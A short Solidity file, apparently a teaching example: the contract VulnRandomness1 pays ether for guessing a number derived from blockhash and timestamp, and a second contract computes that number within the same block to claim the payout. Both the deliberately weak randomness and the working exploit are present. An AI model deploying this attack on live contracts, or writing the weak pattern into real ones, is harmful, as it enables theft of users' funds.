// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract VulnRandomness1 {
    uint public previousAnswer;

    constructor() payable {}

    function unsecureGuess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        previousAnswer = answer;

        if (_guess == answer) {
            (bool result, ) = msg.sender.call{value: 1 ether}("");
            require(result, "Your answer was rigth, but sending reward failed");
        }
    }
}

contract iAmGonnaGiveYouMoneySeriously {
    receive() external payable {}

    function attack(VulnRandomness1 _vulnRandomness1) public {
        uint rightAnswer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        _vulnRandomness1.unsecureGuess(rightAnswer);
    }
}
